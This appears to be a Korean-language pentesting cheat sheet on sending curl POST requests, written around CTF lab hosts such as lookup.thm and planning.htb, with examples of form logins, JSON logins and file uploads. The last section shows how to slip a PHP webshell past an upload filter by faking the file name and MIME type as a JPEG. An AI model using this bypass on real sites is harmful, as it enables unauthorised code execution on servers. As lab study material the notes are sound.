# curl POST 데이터 전송과 파일 업로드

## 폼 데이터 (application/x-www-form-urlencoded)

```bash
# -d === --data
curl -X POST -d "user=admin&pass=secret" http://target.com/login.php

# 실전 로그인: Content-Type 명시 + 응답 쿠키 저장
curl -c cookie.txt -X POST http://lookup.thm/login.php \
  -d 'username=admin&password=password123' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
```

## JSON 전송

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"s3cr3t"}' \
  http://target.com/api/login
```

- JSON 로그인 실례 (grafana):

```bash
curl -c cookie.txt -X POST http://grafana.planning.htb/login \
  -H "Content-Type: application/json" \
  -d '{"user":"admin","password":"REDACTED"}'
```

## 파일 업로드 (-F, multipart)

```bash
curl -F "file=@shell.php" -F "description=profile" http://target.com/upload.php
curl -F "file=@/경로/파일명" http://target.com/upload.php
```

- `@`는 로컬 파일을 첨부한다는 표시다

## 업로드 확장자 우회

```bash
# 파일명과 Content-Type을 이미지로 위장해 php 웹쉘 업로드
curl -X POST -F "file=@webshell.php;filename=image.jpg;type=image/jpeg" http://target.com/upload
```
